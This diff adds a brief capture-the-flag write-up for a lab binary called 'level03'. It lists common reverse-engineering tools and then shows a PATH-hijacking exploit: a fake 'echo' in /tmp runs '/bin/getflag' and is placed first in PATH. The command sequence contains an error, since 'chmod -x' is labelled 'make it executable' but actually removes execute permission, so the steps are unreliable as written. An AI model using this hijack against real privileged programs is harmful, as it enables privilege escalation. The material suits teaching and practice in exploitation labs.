@@ -1,0 +1,24 @@
+# In level03 directory, there is an executable file named 'level03'. When I ran it, it showed 'exploit me'. When I was learning how to exploit an executable, I discovered many commands:
+
+-> file {file} will display infos about it.
+
+-> ltrace {exe} will show library calls.
+
+-> strace {exe} will show sys calls and signals.
+
+-> hexdump {exe} will display the content in ASCII, decimal, hexadecimal, or octal.
+
+-> strings {file} will display the strings of printable characters in files.
+
+-> objdump -d {exe} will show a disassembled version of the executable.
+
+-> gdb {exe} is a debugger.
+
+# I took a long look inside the code with gdb. Tried to retrieve the value of the registers. But I couldn't fin anything, except: To display 'Exploit me' the program uses a call /usr/bin/env echo. The solution is there, I must pass him a fake echo which will contain the command 'getflag'.
+# I have rights in /tmp directory.
+
+$> echo /bin/getflag > /tmp/echo
+$> chmod -x /tmp/echo <- make it executable
+$> export PATH=/tmp:$PATH <- change the path to find the executable
+
+# And There you go !
